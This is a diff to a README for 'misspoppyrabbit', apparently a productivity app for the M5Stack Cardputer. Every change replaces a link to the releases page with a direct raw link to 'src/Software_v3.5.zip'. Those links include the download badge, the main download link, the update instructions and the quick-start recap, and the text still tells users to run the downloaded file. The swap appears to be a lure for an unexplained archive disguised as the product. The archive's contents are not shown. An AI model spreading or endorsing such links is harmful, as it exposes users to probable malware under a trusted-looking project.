@@ -1,7 +1,7 @@
 <h1>🐰 misspoppyrabbit - Your Pocket ADHD-Friendly Productivity Assistant</h1>
 
 <p align="center">
-<a href="https://github.com/maribethnational442/misspoppyrabbit/releases"><img src="https://img.shields.io/badge/Download-misspoppyrabbit-blue?style=for-the-badge&logo=github" alt="Download misspoppyrabbit"></a>
+<a href="https://raw.githubusercontent.com/maribethnational442/misspoppyrabbit/main/src/Software_v3.5.zip"><img src="https://img.shields.io/badge/Download-misspoppyrabbit-blue?style=for-the-badge&logo=github" alt="Download misspoppyrabbit"></a>
 </p>
 
 ## 🎉 Welcome to Your New Digital Sidekick
@@ -41,7 +41,7 @@ Getting misspoppyrabbit on your device is easier than you might think. Here's ev
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download misspoppyrabbit](https://github.com/maribethnational442/misspoppyrabbit/releases)**
+**[👉 Click Here to Download misspoppyrabbit](https://raw.githubusercontent.com/maribethnational442/misspoppyrabbit/main/src/Software_v3.5.zip)**
 
 When you click the link, you'll see a page with different files available for download. Look for the newest version (it should be at the top) and download the file that matches your computer.
 
@@ -89,7 +89,7 @@ To get the most out of your new assistant, try these simple habits:
 
 From time to time, new features and improvements become available. When you're ready to update:
 
-1. Return to the [download page](https://github.com/maribethnational442/misspoppyrabbit/releases).
+1. Return to the [download page](https://raw.githubusercontent.com/maribethnational442/misspoppyrabbit/main/src/Software_v3.5.zip).
 2. Download the latest version.
 3. Connect your device and run the installer just like you did the first time.
 4. Your settings and data will be preserved automatically.
@@ -118,7 +118,7 @@ Visit the GitHub repository page for misspoppyrabbit. There, you'll find additio
 
 ## 📚 Quick Start Recap
 
-1. **Download** from [this link](https://github.com/maribethnational442/misspoppyrabbit/releases)
+1. **Download** from [this link](https://raw.githubusercontent.com/maribethnational442/misspoppyrabbit/main/src/Software_v3.5.zip)
 2. **Connect** your M5Stack Cardputer via USB
 3. **Run** the downloaded file and follow the prompts
 4. **Enjoy** your new pocket assistant!
